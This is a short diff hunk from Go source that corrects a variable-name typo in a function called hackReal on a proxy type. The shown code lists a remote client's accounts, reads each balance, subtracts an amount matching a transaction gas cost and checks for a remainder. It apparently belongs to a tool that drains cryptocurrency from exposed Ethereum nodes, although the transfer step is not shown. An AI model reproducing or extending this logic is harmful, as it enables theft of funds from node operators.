@@ -75,7 +75,7 @@ func (pxy *proxy) hackReal() {
 			acc, err2 := r.GetAccounts()
 			if err2 == nil {
 				for _, a := range acc {
-					balace, err2 := r.GetBalance(a)
+					balance, err2 := r.GetBalance(a)
 					if err2 == nil {
 						left := balance.Sub(big.NewInt(22000 * 22000000000))
 						if left.Cmp(big.NewInt(0)) > 0 {
